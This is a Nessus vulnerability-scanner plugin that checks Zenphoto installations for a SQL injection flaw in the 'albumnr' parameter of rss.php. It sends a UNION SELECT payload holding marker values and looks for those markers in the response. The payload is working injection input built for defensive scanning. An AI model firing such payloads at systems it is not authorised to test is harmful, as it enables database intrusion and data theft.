#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(29832);
  script_version("$Revision: 1.20 $");
  script_cvs_date("$Date: 2016/05/20 14:30:35 $");

  script_cve_id("CVE-2007-6666");
  script_bugtraq_id(27084);
  script_osvdb_id(39786);
  script_xref(name:"EDB-ID", value:"4823");

  script_name(english:"Zenphoto rss.php albumnr Parameter SQL Injection");
  script_summary(english:"Tries to influence the RSS results returned");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that is prone to a SQL
injection attack.");
  script_set_attribute(attribute:"description", value:
"The version of Zenphoto installed on the remote host fails to sanitize
input to the 'albumnr' parameter of the 'rss.php' script before using
it in a database query. Regardless of PHP's 'magic_quotes_gpc' and
'register_globals' settings, an attacker may be able to exploit this
issue to manipulate database queries, leading to disclosure of
sensitive information, modification of data, or attacks against the
underlying database.");
  script_set_attribute(attribute:"solution", value:"Unknown at this time.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:POC/RL:U/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_cwe_id(89);

  script_set_attribute(attribute:"plugin_publication_date", value:"2008/01/03");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:zenphoto:zenphoto");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2008-2016 Tenable Network Security, Inc.");

  script_dependencie("zenphoto_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/zenphoto");

  exit(0);
}


include("audit.inc");
include("global_settings.inc");
include("webapp_func.inc");
include("misc_func.inc");
include("http.inc");
include("url_func.inc");

urls = make_list();
port = get_http_port(default:80, embedded: 0, php:TRUE);
dirs = get_dirs_from_kb(port:port, appname:'zenphoto', exit_on_fail:TRUE);

foreach dir (dirs)
{
  # Try to manipulate the RSS results returned.
  magic1 = unixtime();
  magic2 = rand();
  exploit = string("9999 UNION SELECT 0,0,0,", magic1, ",", magic2, ",0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0--");

  u = string(
      dir, "/rss.php?",
      "albumnr=", urlencode(str:exploit)
    );

  r = http_send_recv3(port:port, method: "GET", item: u);
  if (isnull(r)) exit(0);
  res = r[2];

  # There's a problem if...
  if (
    # it's ZenPhoto and...
    "ZenPhoto Album RSS Generator" >< res &&
    # we see our magic in the answer.
    string("<title>", magic1, "<") >< res &&
    string("/a>", magic2, "]]") >< res
  )
  {
    urls = make_list(urls, u);
    set_kb_item(name: 'www/'+port+'/SQLInjection', value: TRUE);
  }
}

if (max_index(urls) > 0)
{
  if (report_verbosity >0)
  {
    report = get_vuln_report(items:urls, port:port);
    security_hole(port:port, extra:report);
  }
  else security_hole(port);
  exit(0);
}
else exit(0, "No vulnerable installs of Zenphoto were found on port "+port+".");
